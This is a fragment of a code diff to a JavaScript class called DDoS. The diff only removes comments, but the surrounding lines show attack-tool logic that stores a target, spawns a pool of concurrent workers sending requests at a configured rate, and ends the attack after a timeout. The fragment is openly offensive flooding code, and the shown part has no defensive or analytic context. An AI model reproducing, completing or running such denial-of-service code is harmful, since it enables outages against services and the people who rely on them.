@@ -572,7 +572,6 @@ class DDoS {
   this.target = target;
   this.attackType = 'ddos';
 
-  // Start the attack using a pool of workers
   this.ddosAttackPool(target, this.maxThreads, this.requestRate);
 
   this.attackTimeout = setTimeout(() => {
@@ -581,18 +580,15 @@ class DDoS {
   }, this.ATTACK_TIMEOUT);
  }
 
- // Function to manage the DDoS attack using a pool of workers
  async ddosAttackPool(target, numThreads, requestRate) {
   const promises = [];
   for (let i = 0; i < numThreads; i++) {
    promises.push(this.sendDDoSRequest(target, requestRate));
   }
 
-  // Await all threads to complete or until the attack is stopped
   await Promise.all(promises);
  }
 
- // Modified to receive the request rate per thread
  async sendDDoSRequest(target, requestRate) {
   if (!this.attackRunning) return;
 
